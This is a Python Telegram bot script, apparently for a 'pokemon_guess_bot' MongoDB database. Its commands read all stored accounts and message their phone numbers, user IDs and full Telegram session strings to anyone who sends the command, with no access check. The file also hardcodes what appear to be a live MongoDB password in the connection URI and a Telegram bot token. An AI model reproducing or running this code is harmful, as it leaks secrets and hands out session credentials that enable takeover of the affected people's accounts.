import logging
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient
from pymongo.server_api import ServerApi

# Your MongoDB configuration
MONGO_URI = "mongodb+srv://pokemon_bot_user:PokemonBot2024!Secure@cluster0pokemon-bot-clu.iveqoue.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0pokemon-bot-cluster"
DB_NAME = "pokemon_guess_bot"
ACCOUNTS_COLL = "Accounts"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

class MongoDBHandler:
    def __init__(self):
        self.client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
        self.db = self.client[DB_NAME]
        self.accounts_coll = self.db[ACCOUNTS_COLL]
        
    def get_all_accounts(self):
        """Retrieve all accounts from the Accounts collection"""
        try:
            accounts = list(self.accounts_coll.find({}))
            return accounts
        except Exception as e:
            logger.error(f"Error fetching accounts: {e}")
            return []
    
    def close_connection(self):
        """Close MongoDB connection"""
        self.client.close()

# Initialize MongoDB handler
mongo_handler = MongoDBHandler()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    await update.message.reply_text(
        '👋 Hello! I am your Pokemon Bot.\n\n'
        'Available commands:\n'
        '/start - Show this welcome message\n'
        '/accounts - Show all accounts with phone numbers and session info'
    )

async def accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send all accounts with phone numbers and session information"""
    try:
        accounts = mongo_handler.get_all_accounts()
        
        if not accounts:
            await update.message.reply_text("📭 No accounts found in the database.")
            return
        
        response = "📱 **All Accounts - Phone Numbers & Sessions:**\n\n"
        
        for i, account in enumerate(accounts, 1):
            # Extract phone number and session information
            phone_number = account.get('phone_number', 
                              account.get('phone', 
                              account.get('number', 
                              account.get('contact', 'N/A'))))
            
            # Extract session information
            session_string = account.get('session_string', 
                                account.get('session', 
                                account.get('session_id', 
                                account.get('auth_string', 'N/A'))))
            
            username = account.get('username', account.get('name', 'N/A'))
            status = account.get('status', account.get('active', 'Unknown'))
            user_id = account.get('user_id', account.get('telegram_id', 'N/A'))
            
            response += f"**{i}. Account #{i}**\n"
            response += f"   📞 **Phone:** `{phone_number}`\n"
            
            # Show session string (truncated for security)
            if session_string and session_string != 'N/A':
                if len(session_string) > 30:
                    truncated_session = session_string[:30] + "..."
                else:
                    truncated_session = session_string
                response += f"   🔐 **Session:** `{truncated_session}`\n"
            
            if username and username != 'N/A':
                response += f"   👤 **Username:** {username}\n"
            
            if user_id and user_id != 'N/A':
                response += f"   🆔 **User ID:** `{user_id}`\n"
            
            response += f"   📊 **Status:** {status}\n"
            response += "   " + "─" * 30 + "\n"
        
        # If response is too long, split it into multiple messages
        if len(response) > 4096:
            chunks = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for chunk in chunks:
                await update.message.reply_text(chunk, parse_mode='Markdown')
        else:
            await update.message.reply_text(response, parse_mode='Markdown')
            
    except Exception as e:
        logger.error(f"Error in accounts command: {e}")
        await update.message.reply_text("❌ Sorry, there was an error retrieving the accounts.")

async def accounts_detailed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show detailed account information including full session strings (use with caution)"""
    try:
        accounts = mongo_handler.get_all_accounts()
        
        if not accounts:
            await update.message.reply_text("📭 No accounts found in the database.")
            return
        
        response = "🔍 **Detailed Account Information:**\n\n"
        
        for i, account in enumerate(accounts, 1):
            phone_number = account.get('phone_number', 
                              account.get('phone', 
                              account.get('number', 
                              account.get('contact', 'N/A'))))
            
            session_string = account.get('session_string', 
                                account.get('session', 
                                account.get('session_id', 
                                account.get('auth_string', 'N/A'))))
            
            username = account.get('username', account.get('name', 'N/A'))
            status = account.get('status', account.get('active', 'Unknown'))
            user_id = account.get('user_id', account.get('telegram_id', 'N/A'))
            
            response += f"**{i}. Account Details:**\n"
            response += f"   📞 **Phone Number:** `{phone_number}`\n"
            response += f"   👤 **Username:** {username}\n"
            response += f"   🆔 **User ID:** `{user_id}`\n"
            response += f"   📊 **Status:** {status}\n"
            
            # Show full session string in detailed view
            if session_string and session_string != 'N/A':
                response += f"   🔐 **Session String:**\n"
                response += f"   `{session_string}`\n"
            else:
                response += f"   🔐 **Session String:** N/A\n"
            
            response += "   " + "═" * 35 + "\n\n"
        
        # Send as multiple messages if too long
        if len(response) > 4096:
            # First send basic info
            basic_response = "📱 **Accounts - Basic Info:**\n\n"
            for i, account in enumerate(accounts, 1):
                phone_number = account.get('phone_number', 
                                  account.get('phone', 
                                  account.get('number', 
                                  account.get('contact', 'N/A'))))
                username = account.get('username', account.get('name', 'N/A'))
                
                basic_response += f"**{i}. Account #{i}**\n"
                basic_response += f"   📞 **Phone:** `{phone_number}`\n"
                basic_response += f"   👤 **Username:** {username}\n"
                basic_response += "   " + "─" * 30 + "\n"
            
            await update.message.reply_text(basic_response, parse_mode='Markdown')
            
            # Then send session strings separately
            session_response = "🔐 **Session Strings:**\n\n"
            for i, account in enumerate(accounts, 1):
                phone_number = account.get('phone_number', 
                                  account.get('phone', 
                                  account.get('number', 
                                  account.get('contact', 'N/A'))))
                session_string = account.get('session_string', 
                                    account.get('session', 
                                    account.get('session_id', 
                                    account.get('auth_string', 'N/A'))))
                
                session_response += f"**{i}. Phone: {phone_number}**\n"
                if session_string and session_string != 'N/A':
                    session_response += f"`{session_string}`\n\n"
                else:
                    session_response += "Session: N/A\n\n"
            
            await update.message.reply_text(session_response, parse_mode='Markdown')
        else:
            await update.message.reply_text(response, parse_mode='Markdown')
            
    except Exception as e:
        logger.error(f"Error in detailed accounts command: {e}")
        await update.message.reply_text("❌ Error retrieving detailed account information.")

async def show_fields(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show what fields are available in the account documents"""
    try:
        accounts = mongo_handler.get_all_accounts()
        if accounts:
            sample_account = accounts[0]
            response = "🔍 **Available Fields in Account Documents:**\n\n"
            
            for field_name in sample_account.keys():
                field_value = sample_account[field_name]
                response += f"• **{field_name}**: {type(field_value).__name__}\n"
            
            await update.message.reply_text(response, parse_mode='Markdown')
        else:
            await update.message.reply_text("No accounts found to analyze fields.")
            
    except Exception as e:
        logger.error(f"Error in show_fields command: {e}")
        await update.message.reply_text("Error analyzing fields.")

def main():
    """Start the bot."""
    # Replace with your actual bot token
    BOT_TOKEN = "8275817464:AAGnjwnKXvJ9NrTNE4SEnsZAHs1gm1bLDP8"
    
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("accounts", accounts))  # Basic account info
    application.add_handler(CommandHandler("accounts_detailed", accounts_detailed))  # Detailed with full sessions
    application.add_handler(CommandHandler("fields", show_fields))  # Show available fields
    
    # Start the Bot
    logger.info("Bot is running...")
    application.run_polling()
    
    # Close MongoDB connection when bot stops
    mongo_handler.close_connection()

if __name__ == '__main__':
    main()
